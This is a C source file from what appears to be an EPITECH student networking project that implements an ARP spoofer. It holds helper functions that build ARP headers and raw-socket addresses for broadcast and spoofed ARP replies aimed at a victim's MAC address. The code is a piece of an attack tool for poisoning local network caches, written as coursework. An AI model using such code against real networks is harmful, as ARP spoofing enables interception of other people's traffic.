/*
** EPITECH PROJECT, 2022
** NWP_myarpspoof_2018
** File description:
** Created by lucasg,
*/

#include "arp.h"

bool set_arp_source(params_t *params, arp_hdr_t *arp, int socket_fd)
{
    char *source_mac = NULL;

    if (params->print_broadcast || params->print_spoof_mac_addr)
        source_mac = retrieve_mac_addr_as_user(params->interface);
    else
        source_mac = retrieve_mac_addr_as_sudo(params->interface, socket_fd);
    if (!source_mac)
        return false;
    memcpy(arp->source_mac, source_mac, MACADDR_LEN);
    free(source_mac);
    return true;
}

arp_hdr_t *create_arp_packet(params_t *params, int socket_fd)
{
    arp_hdr_t *arp_hdr = malloc(sizeof(*arp_hdr));

    if (!set_arp_source(params, arp_hdr, socket_fd))
        return NULL;
    arp_hdr->hardware_type = htons(ETH_TYPE);
    arp_hdr->hardware_len = MACADDR_LEN;
    arp_hdr->protocol_type = htons(IPV4_TYPE);
    arp_hdr->protocol_len = IPV4_LEN;
    if (params->print_spoof_mac_addr)
        arp_hdr->opcode = htons(ARP_OPCODE_SPOOFED);
    else
        arp_hdr->opcode = htons(ARP_OPCODE_BROADCAST);
    return arp_hdr;
}

struct sockaddr_ll *create_broadcast_arp_socketaddr(params_t *params)
{
    struct sockaddr_ll *sock = malloc(sizeof(*sock));
    int index = if_nametoindex(params->interface);

    sock->sll_family = AF_PACKET;
    sock->sll_hatype = htons(ARPHRD_ETHER);
    sock->sll_protocol = htons(ETH_P_ARP);
    sock->sll_pkttype = PACKET_BROADCAST;
    sock->sll_halen = MACADDR_LEN;
    sock->sll_ifindex = index;
    sock->sll_addr[6] = 0x00;
    sock->sll_addr[7] = 0x00;
    return sock;
}

struct sockaddr_ll *create_spoofed_arp_socketaddr(params_t *params,
    char *vicitm_addr)
{
    struct sockaddr_ll *sock = malloc(sizeof(struct sockaddr_ll));
    int index = if_nametoindex(params->interface);

    sock->sll_family = AF_PACKET;
    sock->sll_protocol = htons(ETH_P_ARP);
    sock->sll_halen = MACADDR_LEN;
    sock->sll_ifindex = index;
    memcpy(sock->sll_addr, vicitm_addr, 8);
    return sock;
}